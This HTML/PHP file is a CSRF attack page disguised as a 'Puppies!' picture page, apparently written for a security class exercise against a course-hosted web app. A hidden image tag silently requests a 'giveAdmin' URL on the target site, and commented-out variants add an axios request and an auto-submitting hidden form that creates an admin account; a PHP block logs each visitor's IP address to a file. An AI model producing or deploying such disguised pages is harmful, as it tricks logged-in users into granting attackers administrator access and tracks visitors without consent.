<html>
<head>
   <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
   <script type="text/javascript">
        axios.get("http://localhost:8001/modules/user/user.php?giveAdmin=6", {

      }).then(function (response) {
           console.log(response)
            // do whatever you want if console is [object object] then stringify the response
       })
   </script> -->
</head>
<body>
<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
        <h1><?= "Puppies!" ?></h1>
        <img src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"></img>
        <img src="http://avadahackdavra.csec.chatzi.org/modules/user/user.php?giveAdmin=3" ></img>
<!-- <form id="myForm" name="myForm" action="
http://avadahackdavra.csec.chatzi.org/modules/admin/newuseradmin.php?id=50
" method="POST"
      target="output_frame">
    <input class="FormData_InputText" type="hidden" name="nom_form" value="pp4f">
    <input class="FormData_InputText" type="hidden" name="prenom_form" value="pp4l">
    <input class="FormData_InputText" type="hidden" name="uname" value="pp10">
    <input class="FormData_InputText" type="hidden" name="password" value="4321">
    <input class="FormData_InputText" type="hidden" name="email_form" value="pp4@mail.com">
    <input type="hidden" name="department" value="1">
    <input class="FormData_InputText" type="hidden" name="comment" value="iuhiu">
    <input type="hidden" name="language" value="el">
    <input type="hidden" name="_token" value="4be764f758a8f200dc5d9983025241df">
    <input type="submit" name="submit" value="click me to show me how much you love puppies!">
    <input type="hidden" name="rid" value="50">
    <input type="hidden" name="pstatut" value="1">
    <input type="hidden" name="auth" value="1">
</form> -->
<!-- <iframe name="output_frame" src="" id="output_frame" width="1000" height="1000">
</iframe> -->
</body>
</html>
<!--<body>-->
<!--        <form name="myForm" id="myForm" target="_myFrame" action="http://localhost:8001/modules/admin/newuseradmin.php" method="post">-->
<!--            <input class="FormData_InputText" type="text" name="nom_form" value="pp4f">-->
<!--            <input class="FormData_InputText" type="text" name="prenom_form" value="pp4l">-->
<!--            <input class="FormData_InputText" type="text" name="uname" value="pp4">-->
<!--            <input class="FormData_InputText" type="text" name="password" value="4321">-->
<!--            <input class="FormData_InputText" type="text" name="email_form" value="pp4@mail.com">-->
<!--            <select name="department" class="auth_input">-->
<!--                <option selected="" value="1">Τμήμα 1</option>-->
<!--                <option value="2">Τμήμα 2</option>-->
<!--                <option value="3">Τμήμα 3</option>-->
<!--                <option value="4">Τμήμα 4</option>-->
<!--                <option value="5">Τμήμα 5</option>-->
<!--            </select>-->
<!--            <input class="FormData_InputText" type="text" name="comment" value="iuhiu">-->
<!--            <select name="language" class="auth_input">-->
<!--                <option selected="" value="el">Ελληνικά</option>-->
<!--                <option value="en">English</option>-->
<!--                <option value="es">Español</option>-->
<!--            </select>-->
<!--            <input type="hidden" name="_token" value="4be764f758a8f200dc5d9983025241df">-->
<!--            <input type="submit" name="submit" value="Υποβολή">-->
<!--            <input type="hidden" name="rid" value="50">-->
<!--            <input type="hidden" name="pstatut" value="1">-->
<!--            <input type="hidden" name="auth" value="1">-->
<!--        </form>-->
<!--    </body>-->
</html>

<?php
$myfile = fopen("newfile.txt", "a+") or die("Unable to open file!");
$txt = $_SERVER['REMOTE_ADDR'] ."\n";
fwrite($myfile, $txt);
fclose($myfile);
?>